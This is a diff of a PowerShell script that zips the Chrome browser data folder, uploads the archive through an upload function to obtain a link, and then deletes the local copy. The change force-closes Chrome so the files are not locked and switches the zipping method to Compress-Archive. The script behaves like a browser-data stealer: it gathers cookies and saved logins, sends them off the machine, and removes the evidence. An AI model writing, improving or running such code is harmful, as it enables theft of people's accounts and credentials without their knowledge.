@@ -72,14 +72,20 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Function to create a ZIP file using Windows' built-in compression
-function Zip-WithWindows {
+# Function to create a ZIP file using PowerShell's Compress-Archive
+function Zip-WithPowerShell {
     param ([string]$sourceFolder, [string]$zipPath)
 
     try {
         if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-        Add-Type -Assembly "System.IO.Compression.FileSystem"
-        [System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolder, $zipPath)
+
+        # Compress-Archive method (PowerShell native ZIP)
+        Compress-Archive -Path "$sourceFolder\*" -DestinationPath $zipPath -Force
+
+        if (-not (Test-Path $zipPath)) {
+            throw "ZIP file was not created successfully."
+        }
+
         Add-Content -Path $logFile -Value "ZIP file created successfully: $zipPath"
     } catch {
         Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
@@ -99,8 +105,12 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Use Windows compression method
-Zip-WithWindows -sourceFolder $chromePath -zipPath $outputZip
+# Close Chrome to avoid file locking issues
+Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 3
+
+# Use PowerShell native ZIP method
+Zip-WithPowerShell -sourceFolder $chromePath -zipPath $outputZip
 
 # Upload the file and get the link
 $link = Upload-FileAndGetLink -filePath $outputZip
@@ -118,4 +128,3 @@ if ($link -ne $null) {
 # Remove the zip file after uploading
 Remove-Item $outputZip -Force
 Add-Content -Path $logFile -Value "Deleted zip file after upload."
-
